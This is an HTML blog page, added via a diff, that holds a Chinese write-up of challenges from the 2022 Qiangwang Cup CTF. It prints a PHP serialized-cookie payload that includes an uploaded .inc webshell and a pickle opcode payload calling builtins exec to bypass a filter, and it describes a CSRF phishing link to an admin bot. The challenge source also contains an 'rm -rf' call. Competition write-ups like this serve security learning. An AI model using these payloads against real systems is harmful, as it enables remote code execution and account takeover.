@@ -1,0 +1,489 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.jpg">
+  <link rel="icon" href="/img/favicon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言强网先锋rcefileconfig.inc.php 123456789&lt;?phpspl_autoload_register();error_reporting(0);function e($str)&amp;#123;    return htmlspecialchars($str);&amp;#125;$userfile &#x3D; empty($_COOKIE[&quot;userfile&quot;])">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022第六届强网杯CTF">
+<meta property="og:url" content="http://gofervor.com/2022/08/04/2022%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFCTF/index.html">
+<meta property="og:site_name" content="b1ub1u的小站">
+<meta property="og:description" content="前言强网先锋rcefileconfig.inc.php 123456789&lt;?phpspl_autoload_register();error_reporting(0);function e($str)&amp;#123;    return htmlspecialchars($str);&amp;#125;$userfile &#x3D; empty($_COOKIE[&quot;userfile&quot;])">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://81.70.101.23:11111/i/2022/08/04/u1w5qe_0.jpg">
+<meta property="og:image" content="http://81.70.101.23:11111/i/2022/08/04/u3atxs_0.png">
+<meta property="og:image" content="http://81.70.101.23:11111/i/2022/08/04/u68bp4_0.png">
+<meta property="og:image" content="http://81.70.101.23:11111/i/2022/08/04/u6l7b7_0.png">
+<meta property="og:image" content="http://81.70.101.23:11111/i/2022/08/04/u6pttn_0.png">
+<meta property="og:image" content="http://81.70.101.23:11111/i/2022/08/04/u8imw6_0.png">
+<meta property="og:image" content="http://81.70.101.23:11111/i/2022/08/04/u8khwb_0.png">
+<meta property="og:image" content="http://81.70.101.23:11111/i/2022/08/04/ubmrka_0.png">
+<meta property="article:published_time" content="2022-08-04T09:08:29.000Z">
+<meta property="article:modified_time" content="2022-08-04T10:33:58.511Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://81.70.101.23:11111/i/2022/08/04/u1w5qe_0.jpg">
+  
+  
+  <title>2022第六届强网杯CTF - b1ub1u的小站</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"gofervor.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>biubiu~</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.jpeg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="2022第六届强网杯CTF">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-08-04 17:08" pubdate>
+        2022年8月4日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.6k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      38 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2022第六届强网杯CTF</h1>
+            
+            <div class="markdown-body">
+              <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h2 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h2><h3 id="rcefile"><a href="#rcefile" class="headerlink" title="rcefile"></a>rcefile</h3><p>config.inc.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">spl_autoload_register</span>();<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">e</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-variable">$userfile</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;userfile&quot;</span>]) ? [] : <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;userfile&quot;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>upload.php</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br>include <span class="hljs-string">&quot;config.inc.php&quot;</span>;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span>[<span class="hljs-string">&quot;error&quot;</span>] == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &lt; <span class="hljs-number">102400</span>) &#123;<br>        <span class="hljs-variable">$typeArr</span> = explode(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-variable">$file</span>[<span class="hljs-string">&quot;type&quot;</span>]);<br>        <span class="hljs-variable">$imgType</span> = array(<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$typeArr</span>[<span class="hljs-number">0</span>]== <span class="hljs-string">&quot;image&quot;</span> | !in_array(<span class="hljs-variable">$typeArr</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$imgType</span>))&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;type error&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$blackext</span> = [<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;php5&quot;</span>, <span class="hljs-string">&quot;php3&quot;</span>, <span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;swf&quot;</span>, <span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>];<br>        <span class="hljs-variable">$filearray</span> = pathinfo(<span class="hljs-variable">$file</span>[<span class="hljs-string">&quot;name&quot;</span>]);<br>        <span class="hljs-variable">$ext</span> = <span class="hljs-variable">$filearray</span>[<span class="hljs-string">&quot;extension&quot;</span>];<br>        <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$blackext</span>)) &#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;extension error&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$imgname</span> = md5(time()).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>;<br>        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;./&quot;</span>.<span class="hljs-variable">$imgname</span>)) &#123;<br>            array_push(<span class="hljs-variable">$userfile</span>, <span class="hljs-variable">$imgname</span>);<br>            setcookie(<span class="hljs-string">&quot;userfile&quot;</span>, serialize(<span class="hljs-variable">$userfile</span>), time() + <span class="hljs-number">3600</span>*<span class="hljs-number">10</span>);<br>            <span class="hljs-variable">$msg</span> = e(<span class="hljs-string">&quot;file: &#123;$imgname&#125;&quot;</span>);<br>            echo <span class="hljs-variable">$msg</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            echo <span class="hljs-string">&quot;upload failed!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
+<p>spl_autoload_register函数可以对没有定义的类自动进行包含操作，spl_autoload_register()如果不指定参数，默认实现函数sql_autoload()，而这个函数在默认情况下，会自动将类名转换为小写，再在小写的类名后加上.inc或.php拓展名作为文件名，然后在路径中包含。<br>即能自动载入<code>.inc</code>和<code>.php</code></p>
+<p>举例：如果目录下有example.inc，且php内容含有<code>class example&#123;...&#125;</code>或者有<code>new example()</code>，spl_autoload_register()会自动搜索、包含example.inc和example.php</p>
+<p>而在config.inc.php中会<code>unserialize($_COOKIE[&quot;userfile&quot;])</code>，可以构造一个类名为上传inc文件名的类</p>
+<p>首先正常上传后缀名为inc的马（.php在黑名单）<br><img src="http://81.70.101.23:11111/i/2022/08/04/u1w5qe_0.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>接着在showfile.php中将cookie修改<br>payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a52b19a367851ff3b193b8a52c954a66</span></span>&#123;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-keyword">new</span> a52b19a367851ff3b193b8a52c954a66;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>
+
+<p>(下图是getflag的inc文件的包含)<br><img src="http://81.70.101.23:11111/i/2022/08/04/u3atxs_0.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h3><p>题目描述：<br>本题下发后，请通过http访问相应的ip和port，例如 nc ip port ，改为<a href="http://ip:port/">http://ip:port/</a><br>docker run -dit -p “0.0.0.0:pub_port:8888” babyweb</p>
+<p>仔细读题，CSRF攻击，要让bot修改密码需要建立的websocket通道是对127.0.0.1:8888&#x2F;bot的，而不是靶机ip&#x2F;bot</p>
+<p>在自己vps上构造钓鱼链接<br><img src="http://81.70.101.23:11111/i/2022/08/04/u68bp4_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>让admin bot访问<br><img src="http://81.70.101.23:11111/i/2022/08/04/u6l7b7_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>以admin和修改后的密码登录，在buy页面购买hint得到源码，但钱不够flag<br><img src="http://81.70.101.23:11111/i/2022/08/04/u6pttn_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>利用python和go对json解析的差异<br><img src="http://81.70.101.23:11111/i/2022/08/04/u8imw6_0.png" srcset="/img/loading.gif" lazyload><br><img src="http://81.70.101.23:11111/i/2022/08/04/u8khwb_0.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="crash"><a href="#crash" class="headerlink" title="crash"></a>crash</h3><p>题目描述：flag in 504 page</p>
+<p>*.py</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">import</span> base64<br># <span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> pickle<br>from flask <span class="hljs-keyword">import</span> Flask, make_response,request, session<br><span class="hljs-keyword">import</span> admin<br><span class="hljs-keyword">import</span> random<br><br>app = Flask(__name__,static_url_path=<span class="hljs-string">&#x27;&#x27;</span>)<br>app.secret_key=random.randbytes(<span class="hljs-number">12</span>)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span>:</span><br><span class="hljs-class">    <span class="hljs-type">def __init__</span></span>(self, username,password):<br>        self.username=username<br>        self.token=hash(password)<br><br>def get_password(username):<br>    <span class="hljs-keyword">if</span> username==<span class="hljs-string">&quot;admin&quot;</span>:<br>        <span class="hljs-keyword">return</span> admin.secret<br>    <span class="hljs-keyword">else</span>:<br>        # conn=sqlite3.connect(<span class="hljs-string">&quot;user.db&quot;</span>)<br>        # cursor=conn.cursor()<br>        # cursor.execute(f<span class="hljs-string">&quot;select password from usertable where username=&#x27;&#123;username&#125;&#x27;&quot;</span>)<br>        # <span class="hljs-keyword">data</span>=cursor.fetchall()[<span class="hljs-number">0</span>]<br>        # <span class="hljs-keyword">if</span> <span class="hljs-keyword">data</span>:<br>        #     <span class="hljs-keyword">return</span> <span class="hljs-keyword">data</span>[<span class="hljs-number">0</span>]<br>        # <span class="hljs-keyword">else</span>:<br>        #     <span class="hljs-keyword">return</span> None<br>        <span class="hljs-keyword">return</span> session.<span class="hljs-keyword">get</span>(<span class="hljs-string">&quot;password&quot;</span>)<br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/balancer&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def flag():<br>    pickle_data=base64.b64decode(request.cookies.<span class="hljs-keyword">get</span>(<span class="hljs-string">&quot;userdata&quot;</span>))<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&#x27;R&#x27;</span> <span class="hljs-keyword">in</span> pickle_data or b<span class="hljs-string">&quot;secret&quot;</span> <span class="hljs-keyword">in</span> pickle_data:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You damm hacker!&quot;</span><br>    os.system(<span class="hljs-string">&quot;rm -rf *py*&quot;</span>)<br>    userdata=pickle.loads(pickle_data)<br>    <span class="hljs-keyword">if</span> userdata.token!=hash(get_password(userdata.username)):<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Login First&quot;</span><br>    <span class="hljs-keyword">if</span> userdata.username==<span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome admin, here is your next challenge!&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You&#x27;re not admin!&quot;</span><br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def login():<br>    resp = make_response(<span class="hljs-string">&quot;success&quot;</span>)<br>    session[<span class="hljs-string">&quot;password&quot;</span>]=request.values.<span class="hljs-keyword">get</span>(<span class="hljs-string">&quot;password&quot;</span>)<br>    resp.set_cookie(<span class="hljs-string">&quot;userdata&quot;</span>, base64.b64encode(pickle.dumps(User(request.values.<span class="hljs-keyword">get</span>(<span class="hljs-string">&quot;username&quot;</span>),request.values.<span class="hljs-keyword">get</span>(<span class="hljs-string">&quot;password&quot;</span>)),<span class="hljs-number">2</span>)), max_age=<span class="hljs-number">3600</span>)<br>    <span class="hljs-keyword">return</span> resp<br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def index():<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;source.txt&#x27;</span>,<span class="hljs-string">&quot;r&quot;</span>).read()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure>
+
+<p>首先构造opcode，不能含有R和secret，需要拼接绕过，自定义一个admin.secret<br>padyload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(cbuiltins</span><br><span class="hljs-string">exec</span><br><span class="hljs-string">S&#x27;c=&quot;import admin;admin.sec&quot;+&quot;ret=&#x27;b1ub1u&#x27;&quot;;exec(c)&#x27;</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(base64.b64encode(opcode))<br></code></pre></td></tr></table></figure>
+
+<p>填入cookie发包，返回500，重新用admin和b1ub1u登录，再进入balancer，进入均衡负载器的页面<br>题目描述flag在504页面，将每个ip的权重设为0或1爆破即可<br><img src="http://81.70.101.23:11111/i/2022/08/04/ubmrka_0.png" srcset="/img/loading.gif" lazyload></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/08/04/NSSCTF%20Round#4/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">NSSCTF Round#4</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/07/18/2022%20DSCTF/">
+                        <span class="hidden-mobile">2022 DSCTF</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>hexo</span></a> <i class="iconfont icon-love"></i> <a href="http://www.gofervor.com/" target="_blank" rel="nofollow noopener"><span>b1ub1u</span></a> 
+  </div>
+  
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        皖ICP备2021017950号
+      </a>
+    </span>
+    
+  </div>
+
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/snowflake.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/containsWord.min.js"></script>
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/nico.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
